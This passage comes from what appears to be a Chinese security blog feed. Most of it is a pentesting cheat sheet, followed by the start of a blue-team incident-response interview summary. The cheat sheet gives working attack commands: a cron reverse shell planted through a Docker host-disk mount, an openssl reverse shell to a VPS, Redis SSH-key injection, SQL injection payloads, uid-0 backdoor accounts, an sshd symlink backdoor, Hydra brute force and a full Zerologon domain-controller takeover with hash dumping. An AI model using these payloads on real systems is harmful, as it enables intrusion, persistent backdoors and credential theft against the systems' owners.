class="built_in">rm</span> $(docker ps -a -q) <span class="comment">#删除所有未运行的容器</span></span><br></pre></td></tr></table></figure><p>docker特权逃逸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l <span class="comment">#查看磁盘文件</span></span><br><span class="line"><span class="built_in">ls</span> /dev <span class="comment">#查看设备文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> hello</span><br><span class="line">mount /dev/sda1 /hello</span><br><span class="line"><span class="built_in">ls</span> /hello</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.52.10/1233 0&gt;&amp;1&#x27;</span> &gt;&gt; /hello/var/spool/cron/root <span class="comment">#写入计划任务</span></span><br><span class="line"></span><br><span class="line">redis未授权写入ssh密钥</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"></span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; <span class="built_in">cat</span> /root/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br><span class="line"><span class="built_in">cat</span> key.txt | redis-cli -h 192.168.1.8 -x <span class="built_in">set</span> xxx</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh    <span class="comment"># 设置redis的备份路径为/root/.ssh/</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys    <span class="comment"># 设置保存文件名为authorized_keys</span></span><br><span class="line">save    <span class="comment"># 将数据保存在目标服务器硬盘上</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>docke提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt -it alpine <span class="comment">#下载并且挂载文件到容器</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it a6f /bin/sh <span class="comment">#进入容器</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -al /mnt <span class="comment">#就是我们物理机的文件，这样就可以写入ssh密钥或者计划任务了</span></span><br></pre></td></tr></table></figure><p>lxd提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">创建一个lxc镜像</span><br><span class="line"></span><br><span class="line">lxc image import ./lxd.gz --<span class="built_in">alias</span> moon</span><br><span class="line"></span><br><span class="line">给他一个库权限</span><br><span class="line"></span><br><span class="line">lxc init moon moon -c security.privileged=<span class="literal">true</span></span><br><span class="line">  </span><br><span class="line">lxc config device add moon moon disk <span class="built_in">source</span>=/ path=/mnt/root  recursive=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">lxc  start moon</span><br><span class="line"></span><br><span class="line">lxc <span class="built_in">exec</span> moon /bin/bash  <span class="comment">#也可以是/bin/sh，上面一个字母别动</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 8423.c  <span class="comment">#复制到当前文件夹，kali那个找exp的软件</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> <span class="comment">#提权</span></span><br><span class="line"></span><br><span class="line">searchsploit -u <span class="comment">#更新最新exp库…</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--force-ssl <span class="comment">#sqlmap跑https，指定证书</span></span><br><span class="line">--proxy http://192.168.31.84:8081 <span class="comment">#代理burp跑sqlmap，可以分块注入</span></span><br><span class="line">-v3                   <span class="comment">#输出详细度  最大值5 会显示请求包和回复包</span></span><br><span class="line">--threads 5           <span class="comment">#指定线程数</span></span><br><span class="line">--fresh-queries       <span class="comment">#清除缓存</span></span><br><span class="line">--flush-session       <span class="comment">#清空会话，重构注入 </span></span><br><span class="line">--batch               <span class="comment">#对所有的交互式的都是默认的</span></span><br><span class="line">--random-agent        <span class="comment">#任意的http头</span></span><br><span class="line">--tamper base64encode            <span class="comment">#对提交的数据进行base64编码</span></span><br><span class="line">--referer http://www.baidu.com   <span class="comment">#伪造referer字段</span></span><br><span class="line"></span><br><span class="line">空格替换    /*%!%2f*/</span><br><span class="line"></span><br><span class="line">--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">加密反弹shell</span><br><span class="line"></span><br><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes </span><br><span class="line"></span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 443 <span class="comment">#创建2个证书</span></span><br><span class="line"></span><br><span class="line">目标机器执行反弹shell </span><br><span class="line"></span><br><span class="line"><span class="built_in">mkfifo</span> /tmp/s;/bin/bash -i &lt;/tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.31.250（你的vps地址）:443 &gt;/tmp/s; <span class="built_in">rm</span> /tmp/s</span><br></pre></td></tr></table></figure><p>sql注入手工</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">获取数据库名 x%<span class="string">&#x27; union select user(),database(),version()#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">获取表名 x%&#x27;</span> union select TABLE_NAME,2,3 from information_schema.TABLES <span class="built_in">where</span> TABLE_SCHEMA=database()<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">获取列名 x%<span class="string">&#x27; union select column_name,2,3 from information_schema.COLUMNS where TABLE_SCHEMA=database() and TABLE_NAME=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">获取字段信息  x%&#x27;</span> union select user,pasword,3 from <span class="built_in">users</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>sqlmap的tamper简单编写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    空格替换/**/ </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> payload:</span><br><span class="line">payloads = payload.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> payloads</span><br></pre></td></tr></table></figure><p>软链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">useradd wxg -u 0 -o -g root -G root|| <span class="built_in">echo</span> <span class="string">&quot;123456&quot;</span> | passwd --stdin wxg </span><br><span class="line"></span><br><span class="line">sudo useradd wxg -u 0 -o -g root -G root || <span class="built_in">echo</span> wxg:123456 | chpasswd </span><br><span class="line"></span><br><span class="line"><span class="comment">#创建账户wxg、密码123456且为root权限</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=12345</span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /路径名/su; /路径名/su -oPort=端口号 <span class="comment">#这个端口是任意的，其格式为</span></span><br><span class="line"></span><br><span class="line">ssh root@x.x.x.x -p 12345</span><br><span class="line"></span><br><span class="line">密码任意输入，即可直接登陆。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">我们上边的利用语句为：</span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=25566</span><br><span class="line"></span><br><span class="line">我们通过“ find /etc/pam.d|xargs grep <span class="string">&quot;pam_rootok&quot;</span> ”得知还有很多程序可以使用，</span><br><span class="line">、、注意：这些文件不同的系统可能会有略微的差别</span><br><span class="line"></span><br><span class="line">/etc/pam.d/chsh</span><br><span class="line">/etc/pam.d/chfn</span><br><span class="line">/etc/pam.d/su</span><br><span class="line">/etc/pam.d/runuser</span><br><span class="line"></span><br><span class="line">我们也可以改为：</span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oPort=25566</span><br><span class="line"></span><br><span class="line">然后攻击机器直接，</span><br><span class="line"></span><br><span class="line">ssh root@x.x.x.x -p 25566</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>格式为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /路径名/特殊程序; /路径名/特殊程序 -oPort=端口号</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><a href="https://gtfobins.github.io/">linux提权平台</a> </p><p>printspoofer windows提权工具</p><p>域内打印机提权漏洞  CVE-2021-1675</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nohup</span> ./frps -c frps.ini&amp;  <span class="comment">#后台运行frps</span></span><br><span class="line"></span><br><span class="line">start /b frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure><p>这是一段frp网络配置socks5</p><p>首先A主机配置</p><p>frps.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr=192.168.31.120 <span class="comment">#kali的ip也可以是vps的ip</span></span><br><span class="line">bind_port=7000</span><br><span class="line">allow_ports=1000-2000</span><br></pre></td></tr></table></figure><p>B主机配置<br>frpc.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=192.168.31.120 <span class="comment">#kali的ip也可以是vps的ip</span></span><br><span class="line">server_port=7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line"><span class="built_in">type</span>=tcp</span><br><span class="line">plugin=socks5</span><br><span class="line">remote_port=1080</span><br></pre></td></tr></table></figure><p>下面是二段frp网络配置</p><p>首先A主机配置</p><p>frps.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr=192.168.31.120 <span class="comment">#kali的ip也可以是vps的ip</span></span><br><span class="line">bind_port=7000</span><br><span class="line">allow_ports=1000-2000</span><br></pre></td></tr></table></figure><p>B主机配置<br>frpc.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=192.168.31.120 <span class="comment">#kali的ip也可以是vps的ip</span></span><br><span class="line">server_port=7000</span><br><span class="line"></span><br><span class="line">[zhongji]</span><br><span class="line"><span class="built_in">type</span>=tcp</span><br><span class="line">local_ip=192.168.1.121 <span class="comment">#b主机本机内网ip</span></span><br><span class="line">local_port=1080</span><br><span class="line">remote_port=1080</span><br></pre></td></tr></table></figure><p>frps.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr=192.168.1.121 <span class="comment">#b主机的ip，作为服务端</span></span><br><span class="line">bind_port=7000</span><br><span class="line">allow_ports=1000-2000</span><br></pre></td></tr></table></figure><p>c主机配置<br>frpc.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=192.168.1.121  <span class="comment">#b主机ip</span></span><br><span class="line">server_port=7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line"><span class="built_in">type</span>=tcp</span><br><span class="line">remote_port=1080</span><br><span class="line">plugin=socks5</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0(compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)  <span class="comment">#白名单爬虫过安全狗</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.dic -P pwd.dic ssh://192.168.1.162 -s 7744 -o hydra.ssh -vV</span><br><span class="line"></span><br><span class="line"><span class="comment">#-o为输出日志 -s 指定端口 -vV 显示详细信息</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001</span><br><span class="line">python2 -m SimpleHTTPServer 8001</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> ff=unix   在vim编辑器中，使windows的代码可以在unix上运行</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt xl</span><br><span class="line"></span><br><span class="line">xl:$1$xl<span class="variable">$bvz59wqTT5z0GPenBl09W</span>.:0:0::root:/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;xl:$1$xl$bvz59wqTT5z0GPenBl09W.:0:0::root:/bin/bash&#x27;</span> &gt;/tmp/xl</span><br></pre></td></tr></table></figure><p>sql注入堆叠注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;show databases; --+查数据库名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>;show tables;--+ 查表</span><br><span class="line"></span><br><span class="line">; show columns from `1919810931114514` ;--+  查询字段  反引号</span><br></pre></td></tr></table></figure><p>TSP（Trusted Service Paths）提权windows路径空格解析，本质也是替换劫持</p><p>cve2020-1472置空域控hash流程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">python3 zerologon_tester.py dc 10.10.10.149  <span class="comment">#检测漏洞是否存在 dc为域控名字 10.10为域控ip</span></span><br><span class="line"></span><br><span class="line">python3 set_empty_pw.py dc 10.10.10.149  <span class="comment">#域控密码置空，也就是空密码，会导致域控脱域，需要及时恢复hash</span></span><br><span class="line"></span><br><span class="line">python3 secretsdump.py hackbox.com/<span class="string">&quot;dc$&quot;</span>@10.10.10.149 -no-pass  <span class="comment">#使用空密码将域控的hash下载</span></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:14a60726614056bf1b0f4f56a7dcc192:::</span><br><span class="line"></span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:669a3273144a82b942377c1001ed03a3</span><br><span class="line"></span><br><span class="line">python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:669a3273144a82b942377c1001ed03a3 administrator@10.10.10.139  <span class="comment">#使用hash通过wmiexec.py获取域管权限</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">执行以下命令，获取目标原始<span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line"></span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line"></span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line"></span><br><span class="line">将其下载下来，下载到kali本地</span><br><span class="line"></span><br><span class="line">get system.save</span><br><span class="line"></span><br><span class="line">get sam.save</span><br><span class="line"></span><br><span class="line">get security.save</span><br><span class="line"></span><br><span class="line">之后将获取其置空前<span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL  <span class="comment">#获取之前hash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$MACHINE</span>.ACC: aad3b435b51404eeaad3b435b51404ee:de14c5940e299e39ab0231d068ca742f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python3 reinstall_original_pw.py dc 10.10.10.149 de14c5940e299e39ab0231d068ca742f</span><br><span class="line">  <span class="comment">#还原hash</span></span><br><span class="line"></span><br><span class="line">验证空密码连接</span><br><span class="line"></span><br><span class="line">python3 secretsdump.py hackbox.com/<span class="string">&quot;dc$&quot;</span>@10.10.10.149 -no-pass</span><br><span class="line"></span><br><span class="line">使用账号密码明文看域控<span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">python3 secretsdump.py  hackbox.com/administrator:!@<span class="comment">#QWEasd123456@10.10.10.139 -just-dc-user &#x27;dc$&#x27;</span></span><br><span class="line"></span><br><span class="line">好像登录不了啊</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 备忘录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝队HW-面试小结</title>
      <link href="/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/"/>
      <url>/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="宏观题"><a href="#宏观题" class="headerlink" title="宏观题"></a>宏观题</h1><h2 id="1-HW的基本流程"><a href="#1-HW的基本流程" class="headerlink" title="1.HW的基本流程"></a>1.HW的基本流程</h2><h3 id="战前加固"><a href="#战前加固" class="headerlink" title="战前加固"></a>战前加固</h3><p>1.信息收集；收集一些客户信息，资产，网络拓扑等等</p><p>2.渗透测试；基本的一些敏感信息泄露，未授权访问，弱口令等等测试</p><p>3.加固；加固账号密码，暴露公网资产，各种历史遗留漏洞和补丁</p><h3 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h3><p>1.判研</p><p>2.加固</p><p>3.溯源</p><p>4.反制</p><p>5.总结</p><h2 id="2-应急响应的基本流程"><a href="#2-应急响应的基本流程" class="headerlink" title="2.应急响应的基本流程"></a>2.应急响应的基本流程</h2><p>1.信息收集；收集中毒主机，客户信息，样本</p><p>2.判断类型；判断是安全事件，什么安全事件，误报，客户不小心操作等等</p><p>3.抑制范围；隔离主机，隔离同网段主机</p><p>4.深入分析；日志分析，进程分析，启动项分析</p><p>5.清理处置；杀进程 ，删后门，删账号，打补丁，历史遗留漏洞，恢复生产</p><p>6.产出报告；写完整的安全事件报告</p><h2 id="3-windows入侵排查思路"><a href="#3-windows入侵排查思路" class="headerlink" title="3.windows入侵排查思路"></a>3.windows入侵排查思路</h2><p>1.检查账号安全；弱口令，端口对外开放，克隆账号</p><p>2.检测异常端口和进程；netstat -ano配合tasklist |findstr “xxx”使用</p><p>3.检测启动项；计划任务，组策略后门，服务</p><p>4.检查系统信息；补丁情况，可疑目录和文件</p><p>5.日志分析；Win+R 打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”，导出 Windows 日志–安全，利用 Log Parser 进行分析</p><h2 id="4-linux入侵排查思路"><a href="#4-linux入侵排查思路" class="headerlink" title="4.linux入侵排查思路"></a>4.linux入侵排查思路</h2><p>1.账号安全</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">who</span>查看当前登录用户（<span class="built_in">tty</span>本地登陆 pts远程登录）</span><br><span class="line">w 查看系统信息，想知道某一时刻用户的行为</span><br><span class="line"><span class="built_in">uptime</span>查看登陆多久、多少用户，负载</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、用户信息文件/etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line"></span><br><span class="line">2、影子文件/etc/shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE<span class="variable">$X7o7bzoouHQVSEmSgsYN5UD4</span>.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.历史命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">通过 .bash_history 查看帐号执行过的系统命令</span><br><span class="line">1、root的历史命令 histroy</span><br><span class="line">2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号的历史命令</span><br><span class="line"></span><br><span class="line">历史操作命令的清除：<span class="built_in">history</span> -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录</span><br></pre></td></tr></table></figure><p>3.检查异常端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line">查看下pid所对应的进程文件路径，</span><br><span class="line">运行<span class="built_in">ls</span> -l /proc/<span class="variable">$PID</span>/exe或file /proc/<span class="variable">$PID</span>/exe（<span class="variable">$PID</span> 为对应的pid 号）</span><br></pre></td></tr></table></figure><p>4.检查异常进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure><p>5.检查开机启动配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/rc.local</span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br></pre></td></tr></table></figure><p>6.检查定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crontab -l 列出某个用户cron服务的详细内容</span><br><span class="line">Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</span><br><span class="line">crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line">crontab -e 使用编辑器编辑当前的crontab文件</span><br><span class="line">如：*/1 * * * * <span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span> &gt;&gt; /tmp/test.txt 每分钟写入文件</span><br><span class="line">2、利用anacron实现异步定时任务调度</span><br></pre></td></tr></table></figure><p><strong>重点关注</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/*</span><br><span 